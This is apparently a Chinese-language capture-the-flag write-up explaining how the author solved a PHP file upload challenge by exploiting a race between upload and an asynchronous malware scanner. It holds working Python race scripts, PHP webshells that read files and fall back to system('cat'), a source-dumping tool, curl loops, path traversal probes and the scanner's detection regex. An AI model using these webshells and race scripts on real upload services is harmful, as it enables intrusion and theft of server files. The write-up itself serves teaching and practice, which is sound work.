---
title: 对一道文件上传题目的分析
published: 2026-09-11
description: '写到了一个文件上传题目花了很多时间使用要好好的复盘一下'
image: ''
tags: [网安, 比赛]
category: 'ctf'
draft: false 
lang: ''
---

# 我刚一提交就发现了三个问题(开了很多次容器所以端口号会有一些不一样)

## 我在你们这才交了几个文件，我已经发现三个问题了：

## 首先，（啪啪啪），在线提交，这文件怎么进了你的私人的目录里呢？

## 第二，这个文件我刚传进去，我还没拿到flag呢，这已经被删了，诶，这说明你们的后端逻辑有问题啊

## 第三，这个木马已经被我传上去了，这位邪恶的出题人，你怎么不给我flag呢？那请问我怎么才能解题呢？

## （尝试提交内容为题目描述的文本文件会有惊喜，不包含括号内容，注意消除行间空格）

直接提交题目文本，发现
```python
import socket
import uuid

HOST = "127.0.0.1"
PORT = 62049


def post_file(content: bytes, filename: str = "desc.txt", field: str = "file") -> str:
    """手工构造 multipart/form-data 上传一个文件，返回响应体"""
    boundary = uuid.uuid4().hex          # 随机分隔符，避免和内容冲突
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
        f"Content-Type: text/plain\r\n\r\n"
    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()

    request = (
        f"POST /submit HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((HOST, PORT), timeout=15)
    s.sendall(request)
    chunks = []
    while True:
        buf = s.recv(65536)
        if not buf:
            break
        chunks.append(buf)
    s.close()

    raw = b"".join(chunks)
    return raw.split(b"\r\n\r\n", 1)[-1].decode("utf-8", "replace")


def main():
    # 题目描述：4 段原文，'\n' 拼接，行间不加任何空格
    desc = "\n".join([
        "我在你们这才交了几个文件，我已经发现三个问题了：",
        "首先，（啪啪啪），在线提交，这文件怎么进了你的私人的目录里呢？",
        "第二，这个文件我刚传进去，我还没拿到flag呢，这已经被删了，诶，这说明你们的后端逻辑有问题啊",
        "第三，这个木马已经被我传上去了，这位邪恶的出题人，你怎么不给我flag呢？那请问我怎么才能解题呢？",
    ])

    print("[*] 上传长度为 %d 字节的描述文本..." % len(desc.encode()))
    resp = None
    for attempt in range(1, 4):          # 端口转发偶尔超时，重试 3 次
        try:
            resp = post_file(desc.encode())
            break
        except (TimeoutError, socket.timeout, OSError) as e:
            print("[-] 第 %d 次失败: %s，重试..." % (attempt, e))
    print("[+] 服务端返回:")
    print(resp if resp else "仍然失败，检查端口转发是否还活着")


if __name__ == "__main__":
    main()
```
返回
```
{"message":"好了，你不就要个flag吗，给你不就是了","flag":"moectf{g3t_0u7_of_h3r3_right_now}","path":"/private/desc.txt"}
```
这个`flag`是假的
从这里可以发现，上传点不校验文件类型，脚本落在可预测路径 `/private/<文件名>` ，可以知道木马的访问地址

立刻 `GET /private/test.txt`：
```
HTTP/1.1 404 Not Found
Not Found
```
多试几次都是 404。文件存活时间极短，说明后端有扫描器，上传后秒删

利用webshell取网页源码，脚本：
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
通过 webshell 批量拉取远端源码

用途：
    已经拿到可执行的 webshell 之后，用它把后端的 php / sh 源码逐个读回来，
    把「我猜后端是这样」变成「后端源码写的是这样」。

原理：
    上传一个读文件马，靠多线程竞态在它被扫描器删掉之前执行，
    让目标文件的源码作为 HTTP 响应体回来。

用法：
    python3 dump_source.py <host> <port> <远端路径> [更多路径...]

示例：
    python3 dump_source.py 127.0.0.1 53885 /app/scanner.php /app/public/index.php
    python3 dump_source.py 127.0.0.1 53885 /start.sh /flag

说明：
    - 结果打印到标准输出，同时存到 ./dumped_<文件名>
    - 单个文件默认最多抢 60 秒，抢不到会跳过并提示
    - 纯标准库，无第三方依赖
"""

import os
import socket
import sys
import threading
import time
import uuid

UPLOADERS = 3      # 并发上传线程数
GETTERS = 10       # 并发访问线程数，抢窗口主要靠它
RUN_SECONDS = 60   # 单个文件最多抢多久


def make_shell(remote_path: str) -> bytes:
    """构造读文件马。

    file_get_contents 可能被 open_basedir 或权限拦下，
    所以用 file_get_contents 优先、system('cat') 兜底。
    """
    p = remote_path.replace('"', '\\"')
    return (
        '<?php $p="%s";'
        ' $c=@file_get_contents($p);'
        ' if($c===false||$c===""){ @system("cat ".escapeshellarg($p)); }'
        ' else { echo $c; }'
        ' ?>' % p
    ).encode()


def raw_request(host, port, payload: bytes, timeout=15) -> bytes:
    """发裸 HTTP 报文。

    端口转发链路上服务端常不主动断连接，recv 会卡到超时。
    超时必须返回已收到的部分，否则已到达的 200 响应会被当成无响应丢掉。
    """
    chunks = []
    s = None
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(payload)
        while True:
            buf = s.recv(65536)
            if not buf:
                break
            chunks.append(buf)
    except Exception:
        pass
    finally:
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
    return b"".join(chunks)


def build_post(host, port, shell_name: str, shell: bytes) -> bytes:
    b = uuid.uuid4().hex
    body = (
        f"--{b}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{shell_name}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + shell + f"\r\n--{b}--\r\n".encode()
    return (
        f"POST /submit HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={b}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body


def build_get(host, port, shell_name: str) -> bytes:
    return (
        f"GET /private/{shell_name} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()


def race_read(host, port, remote_path: str, seconds=RUN_SECONDS):
    """竞态读取单个远端文件，返回文件内容 bytes，失败返回 None"""
    shell_name = "dump_%05d.php" % (abs(hash(remote_path)) % 100000)
    shell = make_shell(remote_path)
    stop = threading.Event()
    hit = {}

    def uploader():
        while not stop.is_set():
            raw_request(host, port, build_post(host, port, shell_name, shell), timeout=12)

    def getter():
        while not stop.is_set():
            resp = raw_request(host, port, build_get(host, port, shell_name), timeout=12)
            if not resp or b"200" not in resp.split(b"\r\n", 1)[0]:
                continue
            body = resp.split(b"\r\n\r\n", 1)[-1]
            # 拿回来的是马自己的源码 => PHP 没被执行，继续抢。
            # 用 escapeshellarg 当马的指纹：目标源码里几乎不可能出现这个词，
            # 而用 file_get_contents 会误伤（scanner.php 源码本身就含它）。
            if not body or b"escapeshellarg" in body:
                continue
            if stop.is_set():
                return
            stop.set()
            hit["body"] = body
            return

    ts = [threading.Thread(target=uploader, daemon=True) for _ in range(UPLOADERS)]
    gs = [threading.Thread(target=getter, daemon=True) for _ in range(GETTERS)]
    for t in ts:
        t.start()
    time.sleep(0.2)          # 访问线程比上传线程稍晚，避免空转
    for t in gs:
        t.start()
    stop.wait(seconds)
    stop.set()
    time.sleep(0.3)
    return hit.get("body")


def main():
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    paths = sys.argv[3:]

    print(f"目标 http://{host}:{port}，待拉取 {len(paths)} 个文件\n")

    for path in paths:
        print(f"{'=' * 60}\n>>> {path}\n{'=' * 60}")
        body = race_read(host, port, path)
        if body is None:
            print("未抢到窗口，跳过（可重跑本脚本单独重试该文件）\n")
            continue
        text = body.decode("utf-8", "replace")
        print(text)
        out = "dumped_" + os.path.basename(path)
        with open(out, "w", encoding="utf-8") as f:
            f.write(text)
        print(f"\n[已保存 -> {out}]（{len(body)} 字节）\n")


if __name__ == "__main__":
    main()
```
涉及文件：

- `/app/public/index.php` —— 上传处理 + 调度扫描器（含钓鱼 flag 常量）
- `/app/scanner.php` —— 安全检查与删除逻辑
- `/app/public/router.php` —— 路由，决定文件是被解析还是被当静态资源
- `/start.sh` —— 容器启动脚本，flag 落点

---

### 1. `/app/public/index.php`（前半段，PHP 逻辑部分）

```php
<?php
declare(strict_types=1);

const PRIVATE_DIR = __DIR__ . '/private';
const FAKE_FLAG = 'moectf{g3t_0u7_of_h3r3_right_now}';
const EGG_TEXT = <<<'TEXT'
我在你们这才交了几个文件，我已经发现三个问题了：
首先，（啪啪啪），在线提交，这文件怎么进了你的私人的目录里呢？
第二，这个文件我刚传进去，我还没拿到flag呢，这已经被删了，诶，这说明你们的后端逻辑有问题啊
第三，这个木马已经被我传上去了，这位邪恶的出题人，你怎么不给我flag呢？那请问我怎么才能解题呢？
TEXT;

function normalize_text(string $text): string
{
    $text = preg_replace('/^\xEF\xBB\xBF/', '', $text) ?? $text;
    $text = str_replace(["\r\n", "\r"], "\n", $text);
    return trim($text);
}

function send_json(array $data, int $status = 200): never
{
    http_response_code($status);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

function clean_filename(string $name): ?string
{
    $name = basename($name);
    if ($name === '' || $name === '.' || $name === '..') {
        return null;
    }
    if (!preg_match('/\A[A-Za-z0-9._-]{1,80}\z/', $name)) {
        return null;
    }
    return $name;
}

function schedule_scan(string $target): void
{
    $cmd = PHP_BINARY . ' ' . escapeshellarg('/app/scanner.php') . ' '
         . escapeshellarg($target) . ' > /dev/null 2>&1 &';
    exec($cmd);
}

function handle_upload(): never
{
    if (!isset($_FILES['file'])) {
        send_json(['error' => '还没提交文件呢。'], 400);
    }

    $file = $_FILES['file'];
    if (!is_array($file) || ($file['error'] ?? UPLOAD_ERR_NO_FILE) !== UPLOAD_ERR_OK) {
        send_json(['error' => '文件提交失败。'], 400);
    }

    if (($file['size'] ?? 0) > 65536) {
        send_json(['error' => '文件太大了，新生作业先别交这么厚。'], 400);
    }

    $filename = clean_filename((string)($file['name'] ?? ''));
    if ($filename === null) {
        send_json(['error' => '文件名只允许字母、数字、点、下划线和短横线。'], 400);
    }

    if (!is_dir(PRIVATE_DIR)) {
        mkdir(PRIVATE_DIR, 0755, true);
    }
    // 后续：写入文件 -> 与 EGG_TEXT 比对 -> 命中则回 FAKE_FLAG -> 否则回 path
    //      最后调用 schedule_scan($target) 后台调度扫描
}
```

关键点：

- `FAKE_FLAG` 是硬编码常量，与真实 flag 无关，属钓鱼分支
- `EGG_TEXT` 与上传内容做比对（先 `normalize_text` 统一换行并 trim），
  这解释了为什么「换行拼接、不带行间空格」能命中
- `clean_filename` 先 `basename` 再过白名单 `[A-Za-z0-9._-]{1,80}`，
  路径穿越确实堵死
- `schedule_scan` 用 `exec(... . ' &')` **后台异步**调用扫描器，
  不等它返回 —— 这是 TOCTOU 窗口存在的根本原因

---

### 2. `/app/scanner.php`（完整）

```php
<?php
declare(strict_types=1);

$target = $argv[1] ?? '';
$privateRoot = '/app/public/private';
$rawDelay = $_ENV['SCAN_DELAY_US'] ?? getenv('SCAN_DELAY_US');
if ($rawDelay === false || $rawDelay === '') {
    $rawDelay = '350000';
}
$delay = (int)$rawDelay;

if ($delay < 100000) {
    $delay = 100000;
}
if ($delay > 2000000) {
    $delay = 2000000;
}

usleep($delay);

if ($target === '' || !is_file($target)) {
    exit;
}

$realTarget = realpath($target);
$realRoot = realpath($privateRoot);

if ($realTarget === false || $realRoot === false
    || !str_starts_with($realTarget, $realRoot . DIRECTORY_SEPARATOR)) {
    exit;
}

$name = basename($realTarget);
$content = file_get_contents($realTarget, false, null, 0, 8192);
if ($content === false) {
    exit;
}

$dangerousExtension = (bool)preg_match('/\.(?:php[0-9]?|phtml|phar)$/i', $name);
$dangerousContent = (bool)preg_match(
    '/<\?(?:php|=)?|shell_exec\s*\(|system\s*\(|passthru\s*\(|exec\s*\(|proc_open\s*\(|popen\s*\(|`/i',
    $content
);

if ($dangerousExtension || $dangerousContent) {
    @unlink($realTarget);
}
```

关键点：

- `usleep($delay)`，默认 350000 微秒 = **0.35 秒**，这就是「文件落地后极短时间内被删」的那段时间
  延迟可通过环境变量 `SCAN_DELAY_US` 调整，钳制在 0.1 至 2 秒之间
- 删除条件是**后缀或内容**二选一命中：
  - 后缀：`\.(php[0-9]?|phtml|phar)$`
  - 内容：`<?` / `<?php` / `<?=` / `shell_exec(` / `system(` / `passthru(` /
    `exec(` / `proc_open(` / `popen(` / 反引号
- 内容检测只读取前 8192 字节
- 删除前有 `realpath` + 前缀校验，扫描器自身不存在路径穿越

由此可修正一处早期判断：删除并非单纯「按后缀区分」，
**内容里出现 `<?` 的 `.txt` 同样会被删**。
之前用纯文本 `.txt` 测试得到「长期存活」，是因为内容不含 PHP 标记。

---

### 3. `/app/public/router.php`（完整）

```php
<?php
declare(strict_types=1);

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/';
$root = realpath(__DIR__);
$candidate = realpath(__DIR__ . $path);

if ($root !== false && $candidate !== false && is_file($candidate)
    && str_starts_with($candidate, $root . DIRECTORY_SEPARATOR)) {
    return false;
}

require __DIR__ . '/index.php';
```

关键点：

- 请求的文件真实存在且在根目录内时 `return false`，
  交回 PHP 内置服务器处理 —— **`.php` 因此被解析执行**
- 文件不存在（已被删）时 `require index.php`，表现为 404 或静态回显
- 这正是「文件活着就能执行、被删了就只能拿到 404」的机制来源

---

### 4. `/start.sh`（完整）

```sh
#!/bin/sh
set -eu

if [ -z "${FLAG+x}" ]; then
    FLAG='moectf{h0t_$0y_m!1k_ha5_n0_$+raw}'
fi

printf '%s\n' "$FLAG" > /flag
chmod 0444 /flag
export FLAG=

mkdir -p /app/public/private
chown -R ctf:ctf /app/public/private

exec su-exec ctf php \
    -d expose_php=0 \
    -S 0.0.0.0:8080 \
    -t /app/public \
    /app/public/router.php
```

关键点：

- 真实 flag 写入 `/flag`，权限 `0444`
- 写入后 `export FLAG=` 清空环境变量，避免从进程环境泄露
- Web 服务以 `ctf` 用户运行，PHP 内置服务器，根目录 `/app/public`
- 这解释了为什么 webshell 要 `readfile("/flag")` 而不是在响应里找

不确定 flag 位置时，可先使用列目录型 webshell 侦察：

```php
<?php echo implode("|", @scandir("/")); echo "\n--\n"; echo implode("|", @scandir("/app")); ?>
```

那么可以根据后端的删除逻辑写paylaod
```php
<?php echo @readfile("/flag"); ?>
```

三个细节：

- `@` 用于**抑制报错**。文件不存在时不会把警告输出到响应中。
- 使用 `readfile` 而非 `system("cat /flag")`：不依赖 `system` 这类常被禁用的函数，成功率更高。
- `echo readfile(...)` 会**额外回显读取到的字节数**，因此输出形如：
  ```
  moectf{h0t_$0y_m!1k_ha5_n0_$+raw}
  34
  ```
  其中 `34` 是 flag 文件的字节长度，属正常输出。

完整脚本：
```python
import socket, threading, time, uuid, sys

HOST, PORT = "127.0.0.1", 49765
SHELL = b'<?php echo @readfile("/flag"); ?>'
UPLOADERS, GETTERS, RUN_SECONDS = 3, 10, 60

stop = threading.Event()
found = {}
stats = {"post": 0, "get": 0, "get200": 0}
lock = threading.Lock()


def raw_request(payload, timeout=15):
    """发一个裸 HTTP 报文并返回完整响应；出错或超时也要保留已收到的部分"""
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        s.sendall(payload)
        chunks = []
        while True:
            buf = s.recv(65536)
            if not buf:
                break
            chunks.append(buf)
        s.close()
        return b"".join(chunks)
    except Exception:
        return b""


def build_post():
    b = uuid.uuid4().hex
    body = (f"--{b}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n").encode() + SHELL + f"\r\n--{b}--\r\n".encode()
    return (f"POST /submit HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={b}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body


def build_get():
    return (f"GET /private/shell.php HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\nConnection: close\r\n\r\n").encode()


def uploader():
    while not stop.is_set():
        raw_request(build_post(), timeout=12)
        with lock:
            stats["post"] += 1


def getter():
    while not stop.is_set():
        resp = raw_request(build_get(), timeout=12)
        with lock:
            stats["get"] += 1
        if not resp or b"200" not in resp.split(b"\r\n", 1)[0]:
            continue
        with lock:
            stats["get200"] += 1
        body = resp.split(b"\r\n\r\n", 1)[-1]
        # 命中判定：拿到 flag，或者返回体不是木马源码本身（说明 PHP 执行了）
        if b"moectf{" in body or (body and body.strip() != SHELL.strip()):
            if stop.is_set():
                return
            stop.set()
            found["body"] = body
            print("\n[+] 命中！webshell 执行结果：")
            print(body.decode("utf-8", "replace").strip())
            return


threads = [threading.Thread(target=uploader, daemon=True) for _ in range(UPLOADERS)]
_getters = [threading.Thread(target=getter, daemon=True) for _ in range(GETTERS)]

print(f"[*] 目标 http://{HOST}:{PORT}，启动 {UPLOADERS} 上传线程 + {GETTERS} 访问线程")
for t in threads:
    t.start()
time.sleep(0.2)          # 让访问线程先把连接铺开，再开始上传
for t in _getters:
    t.start()

deadline = time.time() + RUN_SECONDS
while time.time() < deadline and not stop.is_set():
    time.sleep(1)
    print(f"\r    上传 {stats['post']} / 访问 {stats['get']} / 200响应 {stats['get200']}",
          end="", flush=True)
stop.set()
print("\n[*] 完成" if found else "\n[-] 没抢到窗口，调大 GETTERS 再试")
```

实测输出：

```
[*] 目标 http://127.0.0.1:49765，启动 3 上传线程 + 10 访问线程
[+] 命中！webshell 执行结果：
moectf{h0t_$0y_m!1k_ha5_n0_$+raw}
34
    上传 3 次 / 访问 6 次 / 200响应 6 次
```

约 4 秒命中，多次运行结果一致。

**窗口时长：`usleep(350000)`，即 0.35 秒。**

```php
$rawDelay = $_ENV['SCAN_DELAY_US'] ?? getenv('SCAN_DELAY_US');
if ($rawDelay === false || $rawDelay === '') {
    $rawDelay = '350000';
}
$delay = (int)$rawDelay;
// 钳制在 100000 ~ 2000000 微秒之间
usleep($delay);
```

这就是"文件落地后极短时间内被删"具体是多久。该值可通过环境变量 `SCAN_DELAY_US` 调整，钳制在 0.1 至 2 秒。

### 从源码可以看出来
**删除是后台异步的，这是 TOCTOU 的根源。**

```php
function schedule_scan(string $target): void
{
    $cmd = PHP_BINARY . ' ' . escapeshellarg('/app/scanner.php') . ' '
         . escapeshellarg($target) . ' > /dev/null 2>&1 &';
    exec($cmd);
}
```

上传接口调度完扫描器就立刻返回响应，不等扫描结果。结尾的 `&` 让扫描在后台跑。因此从 HTTP 响应返回到文件被删之间，文件一直是可访问、可执行的。

**文件之所以会被执行，由路由决定。**

```php
if ($root !== false && $candidate !== false && is_file($candidate)
    && str_starts_with($candidate, $root . DIRECTORY_SEPARATOR)) {
    return false;   // 交回 PHP 内置服务器 => .php 被解析执行
}
require __DIR__ . '/index.php';
```

文件在则 `return false`，由 PHP 内置服务器解析；文件不在（已删）则走 `index.php`，表现为 404。


### 3.3 其它打法

**Burp Turbo Intruder**：把上传请求送进 Turbo Intruder，脚本中将上传请求与 `GET /private/shell.php` 交替排队：

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=100,
                           pipeline=False)
    get_req = '''GET /private/shell.php HTTP/1.1
Host: 127.0.0.1:49765

'''
    for i in range(200):
        engine.queue(target.req)
        engine.queue(get_req)

def handleResponse(req, interesting):
    if 'moectf{' in req.response:
        table.add(req)
```

**两个终端并发**：

```bash
# 终端 1
while true; do curl -s -F "file=@shell.php" http://127.0.0.1:49765/submit > /dev/null; done
# 终端 2
while true; do r=$(curl -s http://127.0.0.1:49765/private/shell.php); case "$r" in *moectf*) echo "$r"; break;; esac; done
```

### 总结
该漏洞类型为 **TOCTOU（Time-of-Check to Time-of-Use）**。

```
上传成功 ──► [ 文件存在于 /private/ 且可执行 ] ──► scanner 删除 ──► 404
                        ↑
                  这个窗口就是攻击面
```

后端逻辑是"**先落盘，再扫描，判定为木马则删除**"。检查（扫描）与使用（被 HTTP 请求执行）之间存在时间差，该时间差内文件完全可用。请求密度足够大时，会有请求落在窗口内。

竞态类题目的两个关键指标：**窗口时长**（决定可行性）与**请求密度**（决定命中率）。并发线程数用于提升后者。

一个提升命中率的做法：**访问线程比上传线程先启动 0.2 秒**，使请求在文件落盘时已经铺开。

### 一些通法
已经能执行任意 PHP 之后，读取源码只需要换掉马的内容：把"读 flag"改成"读指定文件"。

```php
<?php $p="/app/scanner.php";
      $c=@file_get_contents($p);
      if($c===false||$c===""){ @system("cat ".escapeshellarg($p)); }
      else { echo $c; } ?>
```

分三步走：

1. **先列目录确定路径**。用 `scandir` 把根目录和 `/app` 列出来，确认扫描器叫什么、在哪。输出短，容易抢到窗口。

   ```php
   <?php echo implode("|", @scandir("/")); echo "\n--\n";
         echo implode("|", @scandir("/app")); ?>
   ```

2. **再逐个读文件**。用上面的读文件马，一次一个文件。

3. **`file_get_contents` 可能被 `open_basedir` 或权限拦下**，因此用 `system("cat")` 兜底。

读取结果仍受秒删影响，所以每个文件都要重新跑一次竞态。已封装为 `dump_source.py`：

```bash
python3 dump_source.py 127.0.0.1 53885 /app/scanner.php /app/public/index.php
python3 dump_source.py 127.0.0.1 53885 /start.sh /flag
```

结果打印到标准输出，同时存为 `dumped_<文件名>`。

### 文件名穿越已限制

处理顺序是先 `basename` 再过白名单。验证方法：

```python
# 传双重写编码的穿越串，看后端报什么错
filename = "..%252fy.txt"
# → {"error":"文件名只允许字母、数字、点、下划线和短横线。"}
```

该报错说明：① 经过 `basename()` 处理 ② 白名单为 `^[A-Za-z0-9._-]+$`。`../`、`..\`、`....//`、`%2e%2e/` 均会被归一化到同一个 basename，此路径不可用。

其它已确认无效的路径：`/flag`（404）、`/private/../flag`（404）、`/robots.txt`、`/app.py`、`/.git/config`。
